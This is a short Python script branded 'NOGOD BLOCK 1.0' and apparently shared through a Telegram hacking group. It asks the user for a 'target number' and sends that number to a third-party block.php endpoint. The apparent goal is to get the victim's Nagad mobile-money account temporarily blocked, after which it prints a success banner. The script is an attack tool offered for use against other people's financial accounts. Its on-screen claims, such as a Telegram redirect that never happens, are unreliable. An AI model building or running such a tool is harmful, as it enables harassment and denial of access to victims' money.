#========SEND======@ZERO_CYBER_TEM
#TG====== https://t.me/ZERO_CYBER_TEM
#=======____FREE______=======
#========______GIVE==========
import os
import requests
import webbrowser
import time

# Updated Colorful Floating ASCII Art
#__________________[ LOGO ]__________________#
logo=(f"""\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m ____   ___      _  ___  ____  
|  _ \ / _ \    | |/ _ \| __ ) 
| |_) | | | |_  | | | | |  _ \ 
|  _ <| |_| | |_| | |_| | |_) |
|_| \_\\___/ \___/ \___/|____/ 
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;92m    [ 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 NOGOD BLOCK 1.0 ]\033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")

ditles=(f""" \x1b[38;5;226m DAVLOPER....--ROJOB ALI💙
                    \x1b[38;5;46m Teligerm.... -- CYBER_TEM 
                     \x1b[38;5;123m   HOME...., Bangladesh..*TO*Rangpur... ☠️""")

class BlockTool:
    @staticmethod
    def start():
        os.system("clear")
        print(logo,ditles)
        print("\033[33m🔄 Redirecting to our Telegram Channel...\033[0m")
        time.sleep(2)  # Adding a small delay before redirecting to the channel
        BlockTool.get_target_number()

    @staticmethod
    def get_target_number():
        os.system("clear")
        print(logo,ditles)
        phone_number = input("\033[33m📞 Enter Your Target Number: \033[0m")
        print("\033[36m" + 45 * '═' + "\033[0m")
        try:
            if phone_number.isdigit():
                print(f"\033[32mYou entered: {phone_number}\033[0m")
            else:
                print("\033[31m❌ Invalid phone number!\033[0m")
                return
        except ValueError:
            print("\033[31m❌ Please enter a valid number.\033[0m")
            return
        BlockTool.block_number(phone_number)

    @staticmethod
    def block_number(phone_number):
        try:
            # Use the actual Nagad block API URL here
            apiUrl = f"https://jhenaigati-adss.com/block.php?number={phone_number}"

            # Make the request to the API
            response = requests.get(apiUrl)

            # Check the response
            if response.status_code == 200:
                print(f"\033[32m✅ Block request sent for {phone_number}\033[0m")
                BlockTool.show_success_notice(phone_number)
            else:
                print(f"\033[31m❌ Failed to block the number: {phone_number}\033[0m")
        except Exception as error:
            print(f"\033[31m⚠️ Request Error: {error}\033[0m")
        
        print("\033[36m" + 45 * '═' + "\033[0m")
        input("\033[33m🔙 Press Enter to Go Back 👉🫡ROJOB")
        os.system("clear")
        BlockTool.start()

    @staticmethod
    def show_success_notice(phone_number):
        print("\033[32m")
        print("╔════════════════════════════════════════════════════════════════════════╗")
        print("║                                                                        ║")
        print(f"║   \033[1m📢 Success! Your Nagad number {phone_number} has been successfully blocked \033[0m")
        print(f"║   \033[1m      for a temporary period. Your request has been processed.\033[0m")
        print("║                                                                        ║")
        print("╚════════════════════════════════════════════════════════════════════════╝")
        print("\033[0m")

BlockTool.start()